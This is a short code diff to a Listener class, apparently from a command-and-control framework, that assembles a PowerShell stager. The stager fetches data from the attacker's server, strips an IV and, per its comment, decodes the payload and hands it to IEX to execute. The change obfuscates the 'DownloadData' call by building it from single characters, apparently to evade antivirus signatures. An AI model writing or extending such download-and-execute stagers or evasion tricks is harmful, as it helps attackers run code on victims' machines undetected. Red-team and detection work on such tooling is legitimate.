@@ -394,8 +394,8 @@ class Listener:
                 stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                 stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)
 
-
-                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
+                stager += "$dd='D'+'o'+'w'+'n'+'l'+'o'+'a'+'d'+'D'+'a'+'t'+'a';"
+                stager += helpers.randomize_capitalization("$data=$WC.$dd($ser+$t);")
                 stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 # decode everything and kick it over to IEX to kick off execution
